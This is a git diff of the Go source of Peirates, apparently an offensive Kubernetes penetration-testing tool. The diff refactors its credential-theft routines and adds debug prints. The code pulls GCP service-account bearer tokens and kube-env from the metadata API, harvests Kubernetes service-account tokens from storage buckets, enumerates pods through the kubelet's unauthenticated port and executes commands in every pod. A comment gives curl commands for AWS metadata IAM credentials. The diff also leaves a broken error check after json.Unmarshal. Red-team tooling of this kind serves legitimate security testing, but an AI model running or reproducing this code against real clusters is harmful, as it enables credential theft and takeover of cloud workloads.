@@ -46,11 +46,15 @@ func getPodList(connectionString ServerInfo) []string {
 		return []string{}
 	}
 
+	println("DEBUG: Made it past auth check")
+
 	responseJSON, _, err := runKubectlSimple(connectionString, "get", "pods", "-o", "json")
 	if err != nil {
 		fmt.Printf("[-] Error while getting pods: %s\n", err.Error())
 		return []string{}
 	}
+
+	println("DEBUG: Made it past get pods -o json")
 
 	type PodsResponse struct {
 		Items []struct {
@@ -61,7 +65,10 @@ func getPodList(connectionString ServerInfo) []string {
 	}
 
 	var response PodsResponse
-	err = json.Unmarshal(responseJSON, &response)
+	json.Unmarshal(responseJSON, &response)
+
+	println("DEBUG: Made it json.Unmarshall")
+
 	if err != nil {
 		fmt.Printf("[-] Error while getting pods: %s\n", err.Error())
 		return []string{}
@@ -121,26 +128,26 @@ func getSecretList(connectionString ServerInfo) ([]string, []string) {
 
 // GetGCPBearerTokenFromMetadataAPI takes the name of a GCP service account and returns a token
 func GetGCPBearerTokenFromMetadataAPI(account string) string {
-	client := &http.Client{}
-	// TURN THIS INTO A FUNCTION SO WE CAN PARSE the ones we want
-	url := "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/" + account + "/token"
-	reqToken, err := http.NewRequest("GET", url, nil)
-	reqToken.Header.Add("Metadata-Flavor", "Google")
-	response, err := client.Do(reqToken)
-	if err != nil {
-		println("[-] Error - could not perform request ", url)
+	var headers []HeaderLine
+	headers = []HeaderLine{
+		HeaderLine{"Metadata-Flavor", "Google"},
 	}
-	defer response.Body.Close()
-	body, err := ioutil.ReadAll(response.Body)
+	url_sa := "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/" + account + "/token"
+
+	reqTokenRaw := GetRequest(url_sa, headers, false)
+	if (reqTokenRaw == "") || (strings.HasPrefix(reqTokenRaw, "ERROR:")) {
+		println("[-] Error - could not perform request ", url_sa)
+		return ("ERROR")
+	}
 	// Body will look like this, unless error has occurred: {"access_token":"xxxxxxx","expires_in":2511,"token_type":"Bearer"}
 	// TODO: Add a check for a 200 status code
 	// Split the body on "" 's for now
 	// TODO: Parse this as JSON
-	tokenElements := strings.Split(string(body), "\"")
+	tokenElements := strings.Split(string(reqTokenRaw), "\"")
 	if tokenElements[1] == "access_token" {
 		return (tokenElements[3])
 	} else {
-		println("[-] Error - could not find token in returned body text: ", string(body))
+		println("[-] Error - could not find token in returned body text: ", string(reqTokenRaw))
 		return "ERROR"
 	}
 }
@@ -908,6 +915,13 @@ func GetNodesInfo(connectionString ServerInfo) {
 
 func ExecuteCodeOnKubelet(connectionString ServerInfo, ServiceAccounts *[]ServiceAccount) {
 	println("[+] Getting IP addresses for the nodes in the cluster...")
+	// BUG : This auth check isn't catching when we're not allowed to get nodes at the cluster scope
+	if !kubectlAuthCanI(connectionString, "get", "nodes") {
+		println("[-] Permission Denied: your service account isn't allowed to get nodes")
+		return
+	} else {
+		println("DEBUG: passed auth checks")
+	}
 	nodeDetailOut, _, err := runKubectlSimple(connectionString, "get", "nodes", "-o", "json")
 	println(nodeDetailOut)
 
@@ -920,6 +934,7 @@ func ExecuteCodeOnKubelet(connectionString ServerInfo, ServiceAccounts *[]Servic
 			println("[-] Error unmarshaling data in this secret: ", err)
 		}
 
+	nodeLoop:
 		for _, item := range getnodeDetail.Items {
 
 			for _, addr := range item.Status.Addresses {
@@ -928,23 +943,20 @@ func ExecuteCodeOnKubelet(connectionString ServerInfo, ServiceAccounts *[]Servic
 				} else {
 					println("[+] Kubelet Pod Listing URL: " + item.Metadata.Name + " - http://" + addr.Address + ":10255/pods")
 					println("[+] Grabbing Pods from node: " + item.Metadata.Name)
-					client := &http.Client{}
-					// Make a request for kube-env, in case it is in the instance attributes, as with a number of installers
-					reqKube, err := http.NewRequest("GET", "http://"+addr.Address+":10255/pods", nil)
-					resp, err := client.Do(reqKube)
-					if err != nil {
-						println("[-] Error - could not perform request http://" + addr.Address + ":10255/pods")
-					}
-					defer resp.Body.Close()
-					body, err := ioutil.ReadAll(resp.Body)
-					if resp.StatusCode != 200 {
-						fmt.Printf("[-] Attempt to get kube-env script failed with status code %d\n", resp.StatusCode)
-						break
+
+					// Make a request for our service account(s)
+					var headers []HeaderLine
+
+					url_sa := "http://" + addr.Address + ":10255/pods"
+					runningPodsBody := GetRequest(url_sa, headers, false)
+					if (runningPodsBody == "") || (strings.HasPrefix(runningPodsBody, "ERROR:")) {
+						println("[-] Kubelet request for running pods failed - using this URL:", url_sa)
+						continue nodeLoop
 					}
 
 					var output []PodNamespaceContainerTuple
 					var podDetails PodDetails
-					json.Unmarshal(body, &podDetails)
+					json.Unmarshal([]byte(runningPodsBody), &podDetails)
 					for _, item := range podDetails.Items {
 						podName := item.Metadata.Name
 						podNamespace := item.Metadata.Namespace
@@ -1307,28 +1319,25 @@ Peirates:># `)
 
 		// [13] Request IAM credentials from GCP Metadata API [GCP only]
 		case "13":
-			// Create a new HTTP client that uses the correct headers
-			client := &http.Client{}
-			// Make a request for our service account(s)
-			reqAccounts, err := http.NewRequest("GET", "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/", nil)
-			reqAccounts.Header.Add("Metadata-Flavor", "Google")
-			resp, err := client.Do(reqAccounts)
-			if err != nil {
-				println("[-] Error - could not perform request http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/")
-			}
-			defer resp.Body.Close()
-			body, err := ioutil.ReadAll(resp.Body)
-			// Parse result as one or more accounts, then construct a request asking for each account's credentials
-			lines := strings.Split(string(body), "\n")
 
-			for _, line := range lines {
+			// Make a request for our service account(s)
+			var headers []HeaderLine
+			headers = []HeaderLine{
+				HeaderLine{"Metadata-Flavor", "Google"},
+			}
+			svcAcctListRaw := GetRequest("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/", headers, false)
+			if (svcAcctListRaw == "") || (strings.HasPrefix(svcAcctListRaw, "ERROR:")) {
+				break
+			}
+			svcAcctListLines := strings.Split(string(svcAcctListRaw), "\n")
+
+			for _, line := range svcAcctListLines {
 				if strings.TrimSpace(string(line)) == "" {
 					continue
 				}
 				account := strings.TrimRight(string(line), "/")
 				fmt.Printf("\n[+] GCP Credentials for account %s\n\n", account)
 
-				// TURN THIS INTO A FUNCTION SO WE CAN PARSE the ones we want
 				println(GetGCPBearerTokenFromMetadataAPI(account))
 			}
 			println(" ")
@@ -1336,23 +1345,20 @@ Peirates:># `)
 
 		// [14] Request kube-env from GCP Metadata API [GCP only]
 		case "14":
-			// Create a new HTTP client that uses the correct headers
-			client := &http.Client{}
 			// Make a request for kube-env, in case it is in the instance attributes, as with a number of installers
-			reqKube, err := http.NewRequest("GET", "http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env", nil)
-			reqKube.Header.Add("Metadata-Flavor", "Google")
-			resp, err := client.Do(reqKube)
-			if err != nil {
-				println("[-] Error - could not perform request http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env/")
+			var headers []HeaderLine
+			headers = []HeaderLine{
+				HeaderLine{"Metadata-Flavor", "Google"},
 			}
-			defer resp.Body.Close()
-			body, err := ioutil.ReadAll(resp.Body)
-			if resp.StatusCode != 200 {
-				fmt.Printf("[-] Attempt to get kube-env script failed with status code %d\n", resp.StatusCode)
+			kubeEnv := GetRequest("http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env", headers, false)
+			if (kubeEnv == "") || (strings.HasPrefix(kubeEnv, "ERROR:")) {
+				println("[-] Error - could not perform request http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env/")
+				// TODO: Should we get error code the way we used to:
+				// fmt.Printf("[-] Attempt to get kube-env script failed with status code %d\n", resp.StatusCode)
 				break
 			}
-			lines := strings.Split(string(body), "\n")
-			for _, line := range lines {
+			kubeEnvLines := strings.Split(string(kubeEnv), "\n")
+			for _, line := range kubeEnvLines {
 				println(line)
 			}
 
@@ -1360,8 +1366,7 @@ Peirates:># `)
 
 		// [16] Pull Kubernetes service account tokens from S3 [AWS only]
 		case "16":
-			// Create a new HTTP client that uses the correct headers
-			// client := &http.Client{}
+			// Implement this
 
 			// curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
 			// curl http://169.254.169.254/latest/meta-data/iam/security-credentials/masters.cluster.bustakube.com
@@ -1404,81 +1409,55 @@ Peirates:># `)
 			} else {
 				println("[+] Got default token for GCP - preparing to use it for GCS:", token)
 			}
+
 			// Need to get project ID from metadata API
-			client := &http.Client{}
-			reqProjid, err := http.NewRequest("GET", "http://metadata.google.internal/computeMetadata/v1/project/numeric-project-id", nil)
-			reqProjid.Header.Add("Metadata-Flavor", "Google")
-			respProjid, err := client.Do(reqProjid)
-			if err != nil {
-				println("[-] Error - could not perform request http://metadata.google.internal/computeMetadata/v1/project/numeric-project-id")
-				respProjid.Body.Close()
+			var headers []HeaderLine
+			headers = []HeaderLine{
+				HeaderLine{"Metadata-Flavor", "Google"},
+			}
+			projectID := GetRequest("http://metadata.google.internal/computeMetadata/v1/project/numeric-project-id", headers, false)
+			if (projectID == "") || (strings.HasPrefix(projectID, "ERROR:")) {
 				break
 			}
-			defer respProjid.Body.Close()
-			body, err := ioutil.ReadAll(respProjid.Body)
-			// Parse result as one or more accounts, then construct a request asking for each account's credentials
-			projectId := string(body)
-			println("[+] Got numberic project ID", projectId)
+			println("[+] Got numberic project ID", projectID)
 
-			// Prepare to do non-cert-checking https requests
-			tr := &http.Transport{
-				TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
-			}
-			sslClient := &http.Client{Transport: tr}
+			// Get a list of buckets, maintaining the same header and adding two lines
+			headers = []HeaderLine{
+				HeaderLine{"Authorization", "Bearer " + token},
+				HeaderLine{"Accept", "json"},
+				HeaderLine{"Metadata-Flavor", "Google"}}
 
-			// Get a list of buckets
 			// curl -s -H 'Metadata-Flavor: Google' -H "Authorization: Bearer $(cat bearertoken)" -H "Accept: json" https://www.googleapis.com/storage/v1/b/?project=$(cat projectid)
-			urlListBuckets := "https://www.googleapis.com/storage/v1/b/?project=" + projectId
-			reqListBuckets, err := http.NewRequest("GET", urlListBuckets, nil)
-			reqListBuckets.Header.Add("Metadata-Flavor", "Google")
-			bearerToken := "Bearer " + token
-			reqListBuckets.Header.Add("Authorization", bearerToken)
-			reqListBuckets.Header.Add("Accept", "json")
-			respListBuckets, err := sslClient.Do(reqListBuckets)
-			if err != nil {
-				fmt.Printf("[-] Error - could not perform request --%s-- - %s\n", urlListBuckets, err.Error())
-				respListBuckets.Body.Close()
+			urlListBuckets := "https://www.googleapis.com/storage/v1/b/?project=" + projectID
+			bucketListRaw := GetRequest(urlListBuckets, headers, false)
+			if (bucketListRaw == "") || (strings.HasPrefix(bucketListRaw, "ERROR:")) {
 				break
 			}
-			defer respListBuckets.Body.Close()
-			bodyListBuckets, err := ioutil.ReadAll(respListBuckets.Body)
-			bucketList_lines := strings.Split(string(bodyListBuckets), "\n")
+			bucketListLines := strings.Split(string(bucketListRaw), "\n")
 
 			// Build our list of bucket URLs
 			var bucketUrls []string
-			for _, line := range bucketList_lines {
+			for _, line := range bucketListLines {
 				if strings.Contains(line, "selfLink") {
 					url := strings.Split(line, "\"")[3]
 					bucketUrls = append(bucketUrls, url)
 				}
 			}
+
 			// In every bucket URL, look at the objects
 			// Each bucket has a self-link line.  For each one, run that self-link line with /o appended to get an object list.
+			// We use the same headers[] from the previous GET request.
 			for _, line := range bucketUrls {
 				println("Checking bucket for credentials:", line)
 				urlListObjects := line + "/o"
-				reqListObjects, err := http.NewRequest("GET", urlListObjects, nil)
-				reqListObjects.Header.Add("Metadata-Flavor", "Google")
-				bearerToken := "Bearer " + token
-				reqListObjects.Header.Add("Authorization", bearerToken)
-				reqListObjects.Header.Add("Accept", "json")
-				respListObjects, err := sslClient.Do(reqListObjects)
-				if err != nil {
-					fmt.Printf("[-] Error - could not perform request --%s-- - %s\n", urlListObjects, err.Error())
-					respListObjects.Body.Close()
-					break
+				bodyListObjects := GetRequest(urlListObjects, headers, false)
+				if (bodyListObjects == "") || (strings.HasPrefix(bodyListObjects, "ERROR:")) {
+					continue
 				}
-				if respListObjects.StatusCode != 200 {
-					fmt.Printf("[-] Attempt to get bucket contents failed with status code %d\n", respListObjects.StatusCode)
-					break
-				}
-
-				defer respListObjects.Body.Close()
-				bodyListObjects, err := ioutil.ReadAll(respListObjects.Body)
-				objectList_lines := strings.Split(string(bodyListObjects), "\n")
+				objectListLines := strings.Split(string(bodyListObjects), "\n")
 
 				// Run through the object data, finding selfLink lines with URL-encoded /secrets/ in them.
-				for _, line := range objectList_lines {
+				for _, line := range objectListLines {
 					if strings.Contains(line, "selfLink") {
 						if strings.Contains(line, "%2Fsecrets%2F") {
 							objectUrl := strings.Split(line, "\"")[3]
@@ -1490,24 +1469,15 @@ Peirates:># `)
 							// Get the contents of the bucket to get the service account token
 							saTokenUrl := objectUrl + "?alt=media"
 
-							reqToken, err := http.NewRequest("GET", saTokenUrl, nil)
-							reqToken.Header.Add("Metadata-Flavor", "Google")
-							reqToken.Header.Add("Authorization", bearerToken)
-							reqToken.Header.Add("Accept", "json")
-							respToken, err := sslClient.Do(reqToken)
-							if err != nil {
-								fmt.Printf("[-] Error - could not perform request --%s-- - %s\n", urlListObjects, err.Error())
-								respToken.Body.Close()
-								break
+							// We use the same headers[] from the previous GET request.
+							bodyToken := GetRequest(saTokenUrl, headers, false)
+							if (bodyToken == "") || (strings.HasPrefix(bodyToken, "ERROR:")) {
+								continue
+								// TODO: mark the continue point
 							}
-							if respToken.StatusCode != 200 {
-								fmt.Printf("[-] Attempt to get object contents failed with status code %d\n", respToken.StatusCode)
-								break
-							}
-
-							defer respToken.Body.Close()
-							bodyToken, err := ioutil.ReadAll(respToken.Body)
 							tokenLines := strings.Split(string(bodyToken), "\n")
+							// TODO: Do we need to check status code?  if respToken.StatusCode != 200 {
+
 							for _, line := range tokenLines {
 								// Now parse this line to get the token
 								encodedToken := strings.Split(line, "\"")[3]
@@ -1549,7 +1519,7 @@ Peirates:># `)
 
 			cmdOpts.commandToRunInPods, _ = readLine()
 
-			// println("Running command ")
+			println("DEBUG: Running command ", cmdOpts.commandToRunInPods)
 			switch input {
 			case "1":
 				println("[+] Please provide the specified pod to run the command: ")
@@ -1566,7 +1536,9 @@ Peirates:># `)
 				}
 			case "2":
 				var input string
+				println("DEBUG: Made it into case 2")
 				if cmdOpts.commandToRunInPods != "" {
+					println("About to run execInAllPods")
 					execInAllPods(connectionString, cmdOpts.commandToRunInPods)
 				} else {
 					fmt.Print("[-] ERROR - command string was empty.")
